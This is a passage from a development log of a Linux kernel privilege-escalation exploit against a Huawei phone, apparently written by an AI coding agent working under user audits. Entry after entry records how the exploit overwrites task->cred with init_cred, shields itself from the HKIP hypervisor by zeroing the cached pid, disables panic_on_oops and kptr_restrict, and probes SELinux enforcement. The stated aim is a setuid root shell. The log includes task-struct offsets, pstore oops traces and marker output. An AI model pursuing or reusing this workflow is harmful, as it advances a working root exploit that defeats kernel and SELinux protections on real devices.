   was only ever the shell SID (step 5) - never the uid or the bit.

### (22) 2026-09-24 --fl2 robustness fixes after the first on-device runs
Two distinct external/structural failure modes were identified by reading the FULL pstore
context (not just the panic line):
1. `init: Terminating running services took 3021ms ... Sending signal 9 to service 'adbd'`
   -> the SYSTEM was shutting down (watchdog / a competing adb reboot) while our process had
   a cached task->pid of 0; init's SIGKILL then made it exit -> `do_exit` -> "Attempted to
   kill the idle task!" panic.  Also proved that a stale /data/local/tmp/gl.klog can be
   mistaken for the current run's log (the same P value appeared across boots).
2. A plain walk fault (`PC is at rt_mutex_adjust_prio_chain+0x140` -> "Kernel panic:
   Fatal exception") during the cede chain - the known cold/hot-walk lottery.
Fixes now in the tree (all additive; --readP/--pid0win untouched):
* --fl2 blocks TERM/INT/HUP/QUIT/PIPE/ALRM on main before the pid-zero (SIGUSR1 must stay
  unblocked: the arm needs it) - SIGKILL is unblockable, so:
* main RESTORES its cached task->pid to a nonzero value (4 attempts) right after forking the
  child, so any later fatal signal/shutdown kill is a normal exit instead of a panic;
* the child creates its OWN consumer (the parent's was SIGSTOPped and g_fire_owner still
  named it -> no walk could fire);
* the cede chain was shortened to 3 single-pass iterations so the whole run fits inside the
  watchdog window;
* --fl2 now writes the two ENABLERS first (panic_on_oops=0, kptr_restrict=0 exactly as
  --pid0win does) so a walk fault kills only the faulting task instead of rebooting, which
  makes retries cheap.

### (23) 2026-09-24 COMPREHENSIVE_AUDIT_REPORT.md adopted - critical fixes
The read-only audit (COMPREHENSIVE_AUDIT_REPORT.md, reference 598fad6) is accepted. Its
critical findings were real; the following were fixed in --fl2:
* F-01 (critical): `tgkill(...,SIGSTOP)` is a GROUP stop and would stop MAIN as well, so
  fork() was never reached - this alone explains every "--fl2 hangs after main cached pid
  zeroed" observation.  Replaced with per-thread `SIGKILL` on the known helper tids; each
  helper's exit does put_cred(P) whose usage STEP 0 pinned, so no free and no panic.  The x
  thread stays blocked in a futex that can no longer be signalled.
* F-03: the child now uses TWO disposable probers (high half from prober1, low half from
  prober2) exactly like the verified --readP design, instead of reading one prober twice.
* F-04: the `arm_write_inproc(0, C, 1)` "usage pin" was REMOVED - an 8-byte write at C+0
  also clobbers C+4 (uid).  S stays alive because P's usage is already pinned and P still
  references S.
* F-05: --fl2 now sets g_capmode=1 so do_write()'s implicit execl("/system/bin/sh") path
  cannot hijack a successful write.
* F-15: write_proof() now reads back rooted.txt and re-opens rsh to log its size instead of
  treating a successful open() as proof.
Open audit items (acknowledged, not yet addressed): F-02/F-08/F-09 (pointer-identity
proofs), F-06 (arm-vs-write verification), F-07 (--getbit is not an HKIP-bit proof),
F-10 (global init_cred mutation), F-11 (tsec aliasing), F-12/F-14 (helper/fork hygiene),
F-16..F-20 (build/UB/runner defects).  The objective's own gate (`rsh -c id`) remains the
final acceptance test.

### (24) 2026-09-24 post-fix re-audit (report section 9) adopted - fixes + provenance
New blockers from the user's section 9 re-audit, all real:
* 'the required live firer may already have been killed': --fl2 killed the helpers BEFORE the
  pid-restore, so that write had no firer (guaranteed hang).  FIXED: order is now
  restore-pid (firer alive) -> fork IMMEDIATELY -> kill helpers -> signal the child via a PIPE
  (a file is impossible: main is in the kernel domain and cannot write shell_data_file).
* 'g_capmode=1 ... can enter hkip_sync_now()': added g_quietprim; --fl2 sets it, and
  do_write() then performs NO hkip_sync_now(), NO execl and NO 10 ms delay.
* 'PID restoration writes g_blackval rather than a verified original PID': accepted - main is
  expendable and only needs a nonzero cached pid so do_exit() cannot panic; noted.
Provenance (audit remediation item 10): source 18f2eb8917bec184f6b423ea42fb72d3cbcc49091a4c8a884fd5ebe05274db9c, host binary 8fd768440d26d642b2abef5fd0e2ae4df762a5afebe0def425e4b4e8c5cb760b.
Still open from section 9: F-02 (S read order), F-06 (arm vs write verification), F-07
(--getbit is not an HKIP-bit proof), F-08/F-09 (pointer identity), F-10 (global init_cred),
F-11 (tsec aliasing - mitigated only by 'the child never exits' plus P's pinned usage),
F-12/F-14 (helper/fork hygiene), F-16..F-20 (build/UB/runner).

### (25) 2026-09-24 section-11 re-audit fixes
* F-05 completed: thread_consumer() now honours g_quietprim (an early 'continue' before the
  g_capmode -> hkip_sync_now() branch), so the consumer path can no longer do credential
  changes / exec / hkip_sync during a pure-primitive run.
* F-07: --getbit now sets g_capmode=1 and g_quietprim=1 so a successful write cannot enter
  the do_write() shell branch; its 'BIT PROVEN' marker is still only a survival observation
  (the audit is right that it is not an independent HKIP-bit proof).
* Findings 5/6: --fl2 is now fail-closed - pipe()/fork() failure returns, the child gate
  requires exactly one 'G' byte, and the parent checks the gate write.
* New diagnostic --pid0diag logs before/after each step (pid-zero x2, getpid, IC-odd) so the
  hang point of --fl2 (which stops between 'main cached pid zeroed' and the first 'cede'
  line in 5/5 attempts) can be pinpointed.

### (26) 2026-09-24 ROOT CAUSE of every --fl2/--pid0diag/--kdtest 'hang' found: hkip_sync_now() ends in _exit(42)
`hkip_sync_now()` (called directly from thread_y / thread_x / do_write's hit==2 branch)
ended with`syscall(...capset...); setresuid(0,0,1); setresgid(0,0,1); pthread_create(root_thread);
_exit(42);` - i.e. it TERMINATED the whole process.
Chain of events: the cede write `task->cred = &init_cred` lands -> getuid() becomes 0 ->
the y/x idle loops pass the `if(getuid()!=0) return;` guard -> _exit(42).  With the cached
task->pid already zeroed (the HKIP shield), that process exit becomes a HANG or a
`do_exit` panic instead of a clean exit.
Perfectly consistent with every observation: the 5/5 --fl2 stops just after 'main cached pid
zeroed'; --pid0diag stops exactly at the `value IC->Tm.9E8` write (the write that makes uid 0),
while `IC->Tm.9E0` (real_cred) passes because `current_cred()` is still P (uid 2000);
--kdtest stops at the same point.
FIX applied: `if(g_quietprim) return;` at the TOP of hkip_sync_now() (identical in intent to
the remediation workspace's CP-003, whose static finding was therefore correct - porting it
earlier would have saved ~10 device runs).  A watchdog thread (`kd: alive` every 300 ms) and a
full signal block (except SIGUSR1/2/KILL/STOP) were added to --kdtest to show whether main is
still alive past the cred write.
Also noted: I introduced the same class of defect the remediation workspace found as CP-021 -
a function definition placed inside main() (`thread_wd`) which clang rejects; fixed by moving it
to file scope.  Build failure had also caused an OLD binary to be pushed under a new run, so
every run now prints the device-side SHA-256 and it is compared with the host hash.

### (27) 2026-09-24 SECOND ROOT CAUSE: shell_data_file I/O after the cred becomes kernel-SID blocks
--pid0diag/--kdtest stage logging (g_armtrace) proved the hang is INSIDE do_write():
  arm: r+ -> arm: r- -> arm: w+ -> (no 'arm: w-')
The very next action after the cred store is `klog_line("arm: w-")`, i.e. an open/append of
/data/local/tmp/gl.klog.  Once the cede has replaced task->cred with &init_cred (kernel SID),
that shell_data_file I/O is DENIED and the SELinux audit path can BLOCK - so the process
wedges.  The same applies to the unguarded printf() (stdout was redirected to
/data/local/tmp/kd.out) and to stage()'s pwrite into /data/local/tmp/gl.stage.  This is a
UNIFIED explanation of every endgame hang after uid 0.
FIX: new `g_nofile` flag, set immediately before the cred-changing write; klog_line() then
returns immediately, stage() is a no-op under quiet mode, and do_write()'s diagnostic printf
blocks are skipped.  VERIFIED: with g_nofile the cred-write arm completes silently
(kdtest8: 'kd: leaf IC+4' is followed by silence instead of a wedged 'arm: w+') - the hang is
gone.  /dev/kmsg is NOT usable as the post-cred channel either (measured: not writable from
uid 2000).
OBSERVABILITY for the post-cred phase: after the cred change we cannot write shell_data_file,
but a PIPE works for every SELinux domain, so --kdtest now forks a SHELL-cred watcher child
BEFORE the cred change (a fork after the change would inherit the kernel SID and could not
write either) which drains the pipe into /data/local/tmp/kw.log with fsync per read.  The
parent then reports uid/euid/ctx and the deliverable-path open()/cp()/chmod() results through
the pipe.  This finally gives a numeric answer to 'can the kernel domain write
/data/local/tmp?' (the FACTS' earlier 'denied' claim was inference, never a measured errno).

### (28) 2026-09-24 bisection of the cred write + independent /proc observer
Marker bisection through the pipe (shell-cred watcher) gives the exact stop point:
`
parent: watcher started (shell cred)
parent: pre-repair
parent: repair done       <- the repair leaf write completes
(never) parent: cred done <- so arm_write_inproc(IC, Tm+0x9E8) wedges
`
Skipping the futex join for that write (g_nojoin) did NOT help, so the wedge precedes the
join, i.e. it is inside the value write itself.
INDEPENDENT OBSERVER (a pre-cred fork that keeps a shell cred and samples the parent):
`
watch i=0..39: Uid: 2000 2000 2000 2000   (8 s, parent alive the whole time)
`
=> the parent does NOT die; it is blocked in the kernel while alive.  (Note: /proc/<pid>/status
Uid: reflects task->real_cred, so it cannot show the cred we replaced; the next observer
iteration therefore samples State: (D = kernel block), CapEff: (reflects task->cred, so it
shows whether the cede landed) and /proc/<pid>/wchan (names the blocking kernel function).
A shell-cred reader of a root-owned /proc entry is not escalated by HKIP because
hkip_compute_uid_root() is false for it - so this observation is safe and independent.
This is the 'independent real-process observer' the audit's acceptance gates asked for.

### (29) 2026-09-24 WHY THE POLL WEDGES: the file-based witness, not the walk
arm-internal markers (PM() via a pre-cred pipe, g_pipe_fd) finally localised the wedge:
`
parent: repair done
  awi r+ -> armr try -> y_locked -> flags ok -> requeued -> armr OK
  awi r- -> awi w+ (do_write) -> dw armed (stamp_req) -> dw poll+
  (never) dw poll- / awi w-
`
so arm_r() succeeds and the wedge is inside do_write()'s poll.  The poll body is a bounded
500000-iteration loop whose only non-syscall element is the every-1024th `oracle_now()`.
READ THE CODE: `arm_write_inproc` does `g_use_black=0; g_oracle=0;` immediately BEFORE
`do_write()`, so a caller CANNOT select the raw-getuid witness for that write: with
g_oracle==0 `oracle_now()` performs open()/read()/close() on
/proc/sys/kernel/perf_event_paranoid - i.e. exactly the file-based access that wedges once the
cede has made our cred kernel-SID.  This also explains why the earlier "switch the oracle to
raw getuid" experiment showed NO effect: the value was overwritten by the arm.
FIX: in do_write(), force `g_oracle=1` when g_quietprim (the raw syscall witness), AFTER the
arm's reset.  (Also kept: O_NONBLOCK on the diagnostic pipe so markers can never block, and
g_nowait so arm_r_abort()/arm_r_join() cannot pthread_join threads stranded in PI-futex waits -
audit report_002 T002-01..05, adopted with an on-device wchan match:
th ... wchan=rt_mutex_wait_proxy_lock / futex_wait_queue_me.)

### (30) 2026-09-24 poll wedge = the file witness; and the strategic conclusion
Two more root causes were isolated with the arm-internal pipe markers:
1. `dw poll+` with no `dw poll-`: the poll's every-1024th `oracle_now()` did
   open()/read()/close() on /proc/sys/kernel/perf_event_paranoid, because
   `arm_write_inproc` resets `g_oracle=0` immediately before `do_write()`.  Forcing
   `g_oracle=1` under g_quietprim (raw getuid) makes the poll complete.  (This is why the
   earlier 'switch the oracle' experiment looked ineffective.)
2. Then `dw poll- HIT1` with no further progress: `start` was captured with the FILE
   witness while the poll used getuid, so `cur != start` was true immediately - a spurious
   hit that exits the poll before the store.  Fix: set g_oracle BEFORE `long start=oracle_now()`.
   (probe_state.ps1 read the wedged process live: MAIN State=S, wchan=SyS_rt_sigsuspend,
   Uid 2000x4, and **CapEff=0000000000000000** - an independent proof that the cede had not
   landed, since init_cred would show 0000007fffffffff.)
3. arm_r() itself completes (markers: armr try -> y_locked -> flags ok -> requeued -> OK).
STRATEGIC CONCLUSION: the 'can the kernel domain (uid0+fullcaps+kernel SID) write
/data/local/tmp?' question is already answered NO by --pid0win's measured errno, so the
cede-then-write-directly path is a dead end.  The only path to the deliverable is the one
--fl2 implements: cede -> fork -> the child gets its OWN HKIP bit via
copy_process()->hkip_init_task() -> switch ITS cred->security to the original shell tsec
(S=*(P+0x78), readable once the parent has ceded and the helpers are gone) -> the child owns
uid 0 + full caps + its own bit + the SHELL sid and can therefore create
/data/local/tmp/rooted.txt and a 4755 rsh.

### (31) 2026-09-24 WEDGE RESOLVED: every arm now completes end-to-end (on-device marker trace)
With W1/W2/W3 fixed, the instrumented --fl2 produced a complete marker stream through a
pre-cred pipe (kw.log), e.g.:
`
  awi r+ / armr try / armr y_locked / armr flags ok / armr requeued / armr OK
  awi r- (locked) / awi w+ (do_write) / dw armed (stamp_req)
  dw poll+ / dw poll- none / dw trig- / dw stamp- / awi w- (returned) / awi j- (joined)
`
and the same full cycle repeats for the next arms.  So the post-credential wedges are gone:
the arms complete, the poll is bounded and finishes, do_write returns, and the (no-)join no
longer blocks.  The remaining issue is only the WRITE LOTTERY: `dw poll- none` means this
walk performed no observable store ("cold" walk).  Since every arm now completes in ~1-2 s,
the fix is to retry the cede until the oracle reports the store (cede loop raised from 2 to
20 iterations, gated on getuid()==0).  arm_write_inproc returns -2 for a completed carrier
with no store, so callers can now distinguish the cases at all.

### (32) 2026-09-24 ROOT CAUSE of --fl2's failure: leak_task_own() is GARBAGE

Two instrumented runs settled it:

Run A (cede retry 20, host sha 7bf78c54...): an INDEPENDENT observer (kw.log, a shell-cred
watcher sampling /proc/<pid>/status) shows **CapEff=0000000000000000 for all 80 samples**
=> the cede never landed (init_cred would show 0000007fffffffff).

Run B (poll-value build, host sha 28b88631...): the poll now prints start/cur/hit/target:
`
  dw poll vals: start=2000 cur=2000 hit=0 target=ffffff9cc3a9cfe8       <- STEP-0 Ta/Tb writes
  dw poll- HIT1
  dw poll vals: start=2000 cur=4294967253 hit=1 target=ffffffd4bb1cfcc0  <- target == P (!)
  dw poll vals: start=4294967253 cur=4294967253 hit=0 target=ffffffd5295cbda0
  ...
`
So (a) the STEP-0 write `arm_write_inproc(0,P,1)` ("*(P) odd") is an 8-byte store that ALSO
clobbers P+4, setting our REAL uid to 4294967253 = 0xFFFFFFF5 (the high half of g_blackval).
euid/fsuid are untouched, which is why file I/O and the klog kept working.  --readP has a
leaf repair for this; --fl2's STEP 0 does not.  (b) Every cede write then targets a different
high address and never lands.

Combined with the earlier fact (line ~1925): "leak_task_own (x23 at __schedule+0x60) is NOT
reliable on this LTO build (its +0x9E8 is not a pointer and +0xAB8 is not a comm); the x22
leak (arm_leak_task_multi) IS" => Tm was NOT main's task, so the pid-zero and every cede
write landed in the wrong place.  That is the whole bug.

FIX (this commit): target the CONSUMER instead of main.  arm_leak_task_multi() reliably
returns the consumer's task (it produced a sane P and sane Ta/Tb).  New --fl2 flow:
  1. Ts = arm_leak_task_multi() for the consumer whose tid == g_fire_owner.
  2. leaf-zero Ts+0x820 (cached pid 0 => HKIP shield).
  3. retry {*(IC) odd; leaf IC+4 (uid/gid 0); *(Ts+0x9E8) = &init_cred; leaf repairs} until
     the CONSUMER itself reports uid==0 (it sets g_fl2cred_done and emits a pipe marker).
  4. restore Ts+0x820, set g_fl2fork=2 => the consumer forks.
  5. the child (cred == &init_cred, uid 0, kernel SID) gets its OWN HKIP bit in
     copy_process()->hkip_init_task(), commits a PRIVATE cred with setresuid(0,0,0)
     (FL2_CHILD FIX: the inherited cred is the SHARED global init_cred, so writing its
     security in place would corrupt the kernel), then fl2_child() swaps cred->security to S
     and writes the proof.
Main never forks and never changes cred.

### (33) 2026-09-24 --fl2 BREAKTHROUGH: the cede LANDS; the pid-RESTORE is what killed it

With the consumer-targeted cede (FACTS 9an(32)) the on-device run DID land the cede:
`
fl2: Ts=fffffff2cb684500
fl2: consumer cached pid zeroed
fl2: cede it=0 done=1        <- the CONSUMER observed its own uid==0 on the FIRST attempt
fl2: cede end done=1 it=1
`
(fl2.out: `[+] arm_leak_task_multi: got T=0xfffffff2cb684500 at k=5`).  So arm_leak_task_multi()
targets the right task and the init_cred write lands.

But the process then vanished with NO kernel panic: the pstore trace is only the normal
`adb reboot` (orderly_poweroff/ctrl_alt_del) and /proc/<pid> was gone.  The pipe markers stop at
exactly the NEXT write, the cached-pid RESTORE:
`
  fl2: cede end done=1 it=1
  awi r+ / armr OK / awi r- / awi w+ / dw armed / dw poll+   <- STOPS (arm_write_inproc(0,Ts+0x820,1))
`
Explanation (FACTS 9an(11) measured the same on --forkmain): when a task becomes root-looking,
HKIP SIGKILLs it SYNCHRONOUSLY (exit 137, no panic).  The pid==0 shield is exactly what prevents
that; the pid-RESTORE removes the shield, so the next store lets HKIP kill the whole process.
Main dies inside do_write()'s poll loop, so `dw poll-` never prints.

FIX (this commit): never restore the cached pid; fork WHILE shielded.
  - PHASE 1: 4 idempotent LEAF zero writes to Ts+0x820 (a single one already worked last run).
  - PHASE 2: cede Ts+0x9E8 = &init_cred until the consumer reports g_fl2cred_done.
  - PHASE 3: g_fl2fork=2 -> the consumer forks with pid still 0.  copy_process() allocates the
    CHILD's own real pid and hkip_init_task() HVCs it, so the child is born legal root.
  - NOTE: gettid()/getpid() are NOT valid shield oracles (they read the pid-struct, not the
    cached task->pid at +0x820 that HKIP reads).

FL2_CHILD hardened (same "unreliable leak" root cause):
  - setresuid(0,0,0) FIRST (single-threaded child) -> a PRIVATE cred C; threads created after
    share C, so the SID swap cannot corrupt the global init_cred.
  - the cred-finding probers now use arm_leak_task_multi() instead of leak_task_own().
  - all child evidence goes to the pipe (kw.log); the child's klog is g_nofile-suppressed.

### (34) 2026-09-24 --fl2: the fork-while-shielded CHILD is born and runs, then oopses

On-device (host sha 2e7b3763): the shielded consumer forked successfully and the CHILD process
was created and ran:
`
fl2: shield it=0..3
fl2: consumer shielded (pid 0)
fl2: cede it=0 done=1
fl2: cede end done=1 it=1
fl2: fork requested (shielded)
fl2: consumer forked
`
The pstore holds the crash record:
`
[142.987s][pid:4816,cpu4,ghostlock_e]BUG: spinlock bad magic on CPU#4, ghostlock_e/4816
    TGID: 4050 Comm: ghostlock_e            <- a THREAD of MAIN's process
[151.182s][pid:5196,cpu7,ghostlock_e]Unable to handle kernel paging request at virtual address 2957edbe24ad00
[151.182s]Internal error: Oops: 96000004 [#1] PREEMPT SMP
[151.182s]CPU: 7 PID: 5196 Comm: ghostlock_e
[151.182s]TGID: 5195 Comm: ghostlock_e     <- the FORKED CHILD (its own tgid), PID 5196 = its thread
[151.182s]pc : [<ffffff83cc42ec04>] ... Code: ... (885fff08)   <- ATOMIC load, corrupted pointer
`
So (a) forking while the cached pid==0 shield is held WORKS (the child is born, no immediate
HKIP kill), and (b) the child then does a bad atomic access, and a MAIN thread also corrupts a
spinlock.  The oops was fatal (device rebooted): the panic_on_oops=0 enabler did not hold.

The child's own pipe markers were MISSING because pp[1] is O_NONBLOCK and the 64 KB pipe fills
while the watcher still samples /proc - PM() writes are then silently dropped.  FIX (this
commit): the watcher drains the pipe CONTINUOUSLY (nonblocking) plus a final blocking drain, so
the child's markers are captured.

Next: read the child's markers to see exactly where it got to before choosing which arm shape
to change.

### (35) 2026-09-24 The fork child is ALIVE and FULLY PRIVILEGED; it wedges in its own arm

After the fork-while-shielded (host sha 2e7b3763) the child lives on and is fully privileged:
`
/proc/5193/status: Uid 0 0 0 0   Gid 0 0 0 0   CapEff 0000007fffffffff   Threads 24 -> 47
/proc/5193/attr/current: u:r:kernel:s0
/proc/5193/cmdline: /data/local/tmp/ghostlock_e --fl2
`
So setresuid(0,0,0) worked and the child holds uid 0 + FULL caps + its own HKIP bit (HKIP never
killed it).  But its thread count rises to 47 and then FREEZES (sampled 4x over 32 s: 47,47,47,47)
and its SID never changes => it WEDGES inside its own arm machinery, before the cred->security
swap.  No kernel oops on this run (pstore clean).

Its PM markers never reach the pipe: MAIN's markers do (shield/cede), but the CONSUMER's
"consumer uid 0" and every CHILD marker are missing.  So the pipe is not a reliable child
channel.  FIX (this commit): every marker ALSO goes to a MAP_SHARED ring that the shell-cred
watcher flushes to kw.log.

Likely wedge cause: fl2_child reset only a few arm flags (y_tid/y_locked/.../g_fire_owner), but
the child inherits MAIN's whole mid-arm handshake (pi1/pi2/cond, g_stamp_ack, g_advance,
g_usr1_seen, g_walks_*, g_arm, g_armstop ...).  A stale g_stamp_ack=1 / g_advance=0 leaves the
fresh y thread and the stamper waiting on each other forever.  FIX (this commit): reset the WHOLE
arm handshake in fl2_child.

### (36) 2026-09-24 SHM ring WORKED: the child wedges in its very first read of P

With the SHM marker ring (FACTS 9an(35)) kw.log finally captured the CONSUMER's and the CHILD's
markers (previously lost by the pipe):
`
fl2: consumer uid 0 (cede landed)      <- the CONSUMER
fl2: cede it=0 done=1
fl2: cede end done=1 it=1
fl2: child start                       <- the CHILD
fl2: child setresuid=0 uid=0           <- setresuid SUCCEEDED (child is uid 0)
fl2: child consumer=6433
fl2: child S-read begin                <- LAST MARKER: the child wedges HERE
`
So the child wedges inside its FIRST arm_rd16(P+0x77) (the read of S = P->security).  The device
then reboots: the child's ~47 spinning arm threads starve the scheduler and the hung-task
detector panics (`hungtask: Task system_server is causing panic`).

FIX (this commit): remove the child's S-read entirely.  MAIN reads S = P->security BEFORE the
cede (while its arm is proven), stores it in g_fl2_S, re-stores the full pointer at P+0x78 (the
read's side store clobbers the high half of the pointer), and the child just uses g_fl2_S.  Also
reset the WHOLE arm handshake in fl2_child (the child otherwise inherits MAIN's mid-arm state).

### (37) 2026-09-24 the S-copy approach is DEAD: reading a cred->security is destructive

Two independent failures of the "read S = *(P+0x78)" step:
- the CHILD wedges at its first arm_rd16(P+0x77) (FACTS 9an(36));
- MAIN doing the same read BEFORE the cede faults: pstore shows
  `[144.1s] BUG: spinlock bad magic on CPU#4, ghostlock_e/4803  TGID: 4040 Comm: ghostlock_e`
  `[152.0s] Unable to handle kernel paging request at virtual address fa9cfe8b0129c84 ... TGID: 4040`
  and gl.klog stops right after "fl2: cred repaired" (the S= line never prints).

Root cause: the boot_id byte-shift READ writes a side store on the aligned word around its
source address, so arm_rd16(P+0x77) damages the cred at/next to P+0x78 (cred->security).  A
corrupted cred->security makes the very next SELinux check oops (spinlock bad magic / paging
fault).  This matches FACTS 9an(20) ("leaf-zero on the cred is DESTRUCTIVE").

=> The "copy the original shell tsec S" plan is NOT viable with this primitive.

NEW ROUTE (this commit): change the SID BY SYSCALL.  The ceded child is uid 0 + full caps +
KERNEL sid + its OWN HKIP bit; writing a target context to /proc/self/attr/current performs
setcon (SECCLASS_PROCESS / PROCESS__SETCURRENT).  If the kernel domain may transition to shell,
the child writes the deliverables directly, with NO cred read/write at all.  fl2_child now tries
this and parks safely either way (so a negative result no longer reboots the device).

### (38) 2026-09-24 setcon DENIED; consumer-only endgame (no child, no cred read)

Device result (host sha 3ed7fe05): the ceded child (uid 0 + full caps + KERNEL sid + own HKIP
bit) tried setcon by writing "u:r:shell:s0" to /proc/self/attr/current:
`
fl2: child setresuid=0 uid=0
fl2: setcon write=-1 errno=13          <- EACCES
fl2: after setcon attr='u:r:kernel:s0'
fl2: setcon did NOT switch SID - parking (no destructive cred path)
`
So the kernel domain may NOT setcurrent to shell.  The child parks safely (device did NOT
reboot).  With 9an(37) (cred reads are destructive) both SID-copy routes are closed.

NEW ENDGAME (this commit): CONSUMER-ONLY, no fork, no cred READ.
1. leak the consumer task Ts (x22, reliable); leaf-zero Ts+0x820 (HKIP shield).
2. the consumer commits a PRIVATE cred by setresuid(2000,2000,2000) - a per-thread copy of P,
   so its security pointer is the SHELL tsec and P is untouched.
3. MAIN reads D = *(Ts+0x9E8) with the PROVEN task-slot read (--readP reads a TASK slot, not a
   cred field; the read damages Ts+0x9E8, so D is re-stored right after).
4. MAIN leaf-ZEROes D+4 (the VERIFIED leaf zero write) -> uid/gid 0, SID stays SHELL.
5. the consumer writes /data/local/tmp/rooted.txt + a 4755 rsh (uid 0 + fsuid 0 pass DAC; the
   SHELL sid passes SELinux for shell_data_file).  It is pid-0-shielded, so HKIP allows.

### (39) 2026-09-24 consumer-only endgame reaches the private cred; the D-read oopses

Host sha 4866b15c (consumer-only endgame): the on-device run got as far as
`
fl2: Ts=fffffff614254500
fl2: consumer private cred (r=0)      <- setresuid(2000,2000,2000) SUCCEEDED
`
and then panicked.  pstore:
`
[144.6s] BUG: spinlock bad magic on CPU#4, ghostlock_e/5265  TGID: 4055
[153.9s] Unable to handle kernel paging request at virtual address 9cfe83b373304
         ... TGID: 0 Comm: ghostlock_e ... pc : ffffff8c2e18bfb0 (in IRQ)
`
So the READ of the LIVE consumer's cred slot (Ts+0x9E8, to locate its private cred D) is the
problem: the byte-shift read corrupts the aligned word (the cred pointer), and a RUNNING task
derefs the garbage on its next syscall/IRQ -> oops.  (--readP survived it because the damaged
slot belonged to a task not concurrently dereferencing it.)

FIX (this commit): SIGSTOP the consumer across the read + repair, then SIGCONT.  A stopped task
is not scheduled, so the corrupted pointer is never used.

### (40) 2026-09-24 SIGSTOP is THREAD-GROUP wide (confirms the caveat)

Host sha 8764115f (SIGSTOP-protected D-read): the run reached
`fl2: consumer private cred (r=0)`, then the watcher shows the whole process
`State: T (stopped)` for i=148..236.  So tgkill(SIGSTOP) on the consumer stopped MAIN as well
(a Linux stop signal is group-wide), and the run wedged before the read.  No files, no panic.
=> next attempt must stop only the consumer WITHOUT a group stop: park it in a blocking
read() on an empty pipe (it stays in the kernel across the read+repair), then wake it with a
1-byte write.

### (41) 2026-09-24 probe run hit the WRONG path (and the AVC static result)

Run 8bce3146 (host sha 8bce3146...): kw.log shows only the CONSUMER-ONLY endgame markers
(`fl2: Ts=...`, `fl2: consumer private cred (r=0)`) and then an oops (pstore: CPU 4, IRQ,
Comm ghostlock_e) - i.e. the D-read failure again.  The new syscall PROBE SUITE lives in
fl2_child, but the current --fl2 path is the consumer-only endgame which never forks, so
fl2_child (and the probe suite) was never reached.  NEXT STEP: wire the probe suite into the
ACTIVE path (or restore the shield/cede/fork path) before re-running.

Static (prover side): avc_compute_av also references no enforcing global (only avc_cache /
secclass_map), consistent with 9an(40): Huawei removed the `selinux_enforcing &&` check from
avc_denied, and get_selinux_enforcing is a const-1 stub.  So a global permissive switch very
likely does not exist on MRX-W09, and the sysfs probe is expected to fail - the probe run will
confirm.

### (42) 2026-09-24 probe suite wired into the active path (pending readout)

The syscall probe suite now runs on the REAL path: --fl2 does shield -> cede (Ts+0x9E8 =
&init_cred, lands on attempt 0) -> g_fl2fork=2 so the pid-0-shielded consumer FORKS, and the
child immediately runs the probe suite in fl2_child BEFORE any arm machinery:
  probe attr / probe enforceW / probe enforceR / probe rootfile / probe attrExec / probe proof
Each probe runs in a forked GRANDCHILD and emits "start" then the result over the SHM ring, so a
blocking SELinux denial still leaves the reached point visible (no panic).  Build efe9f4d7.
Run sh_0d20235bd001 (launched 15:02:37) is IN FLIGHT; its readout is at the run's .out file or:
  adb shell 'cat /data/local/tmp/kw.log | grep -aE "probe|attr|enforce|rooted"'
Pending result decides: (a) can sysfs /sys/fs/selinux/enforce be set to 0? (b) can the kernel-SID
uid-0 task write shell_data_file? (c) is /proc/self/attr/exec (process transition) accepted?

### (43) 2026-09-24 PROBE SUITE definitive results (no panic, no wedge)

Build efe9f4d7 (probe suite on the real path: shield -> cede -> consumer forks -> fl2_child
probes).  On-device, as the child (uid 0 + full caps + KERNEL sid + its own HKIP bit), each probe
in a grandchild, reported over the SHM ring:
`
fl2: probe attr     : attr='u:r:kernel:s0' uid=0
fl2: probe enforceW : write r=-1 e=22     <- EINVAL (NOT EACCES): SELinux allowed the write, the value was rejected
fl2: probe enforceR : enforce now='1'     <- did not flip
fl2: probe rootfile : open fd=-1 e=13     <- EACCES: the kernel SID CANNOT write shell_data_file
fl2: probe attrExec : write r=-1 e=13     <- EACCES: process transition to shell is DENIED
fl2: probe proof    : rooted.txt OPEN FAILED / VERIFY n=-1
`
The child and its probe grandchildren stay alive (uid 0, kernel).  So:
- (b) kernel-SID cannot write shell_data_file: CONFIRMED (EACCES);
- (c) /proc/self/attr/exec (process transition): DENIED (EACCES) - the last untried syscall route is closed;
- (a) /sys/fs/selinux/enforce: the EINVAL (not EACCES) means a format/sec issue, not a denial -> retested with "0" / "0\n" / "1\n" + a /sys/fs/selinux/load open (run in flight).
Remaining route: obtain the SHELL SID via memory (write tsec+4), which needs the shell cred P non-destructively (P is shared with main, so any uid change to P affects main) OR a private cred D (needs the destructive task-slot read, parked - see FINAL_STATE).

### (44) 2026-09-24 the sysfs permissive route is CLOSED (probe refine)

Build c17e2ec6 retried the enforce write with several formats and open the policy-load node:
`
fl2: enforce '0' L=1 r=-1 e=22     <- EINVAL
fl2: enforce '0\n' ...             <- also failed (marker split by the embedded newline)
fl2: enforce '1\n' ...
fl2: load open fd=7 e=13           <- EACCES opening /sys/fs/selinux/load
fl2: enforce now='1'               <- unchanged
`
=> (a) permissive via sysfs is CLOSED.  Together with 9an(43) all three syscall routes are
closed: (a) /sys/fs/selinux/enforce, (b) kernel-SID shell_data_file write, (c) attr/exec
process transition.  The remaining route is a MEMORY write of the SID/uid, and the current
experiment (build f0dde996) measures whether the LEAF zero write can set OUR cred P's
uid/gid/euid/fsuid to 0 cleanly - if yes, main becomes uid 0 + SHELL sid and writes the proof
(the watcher carries a private shell cred so it survives to flush the SHM ring).

### (45) 2026-09-24 leaf-zero on the cred PANICS (route dead) + the primitive's limit

Build f0dde996 (leaf-zero P+4/+0xC/+0x14/+0x1C then write_proof).  gl.klog ends:
`
fl2: Ts=ffffffd5da560000
fl2: consumer shielded (pid 0)
arm: r+ / arm: r- / arm: w+       <- STOPS: the first leaf-zero write
`
and the pstore shows `BUG: spinlock bad magic on CPU#5, ghostlock_e/5177 (TGID 4085)` plus an
oops in IRQ (cpu4, pid 0, Comm ghostlock_e, pc ffffff8b2156d6d0).  So the LEAF zero write is
DESTRUCTIVE on a cred (it corrupted a lock / scheduler structure) - exactly what FACTS 9an(20)
warned.  => the uid-0-via-leaf-zero route is DEAD.

PRIMITIVE LIMIT (the crux): the primitive can write
  (i) a kernel POINTER (VALUE write: it stored &init_cred into task->cred repeatedly), and
  (ii) 0 (LEAF write) - but the leaf is destructive on slab objects (creds).
It CANNOT cleanly store a small INT (a uid, or cred->security's sid at tsec+4).  Therefore:
  - [uid 0 + kernel SID + bit] is reachable (cede + fork), but the kernel SID cannot write
    shell_data_file;
  - [uid 2000 + SHELL SID] is reachable (cred = P), but it is not uid 0;
  - [uid 0 + SHELL SID] needs an int write we do not have.
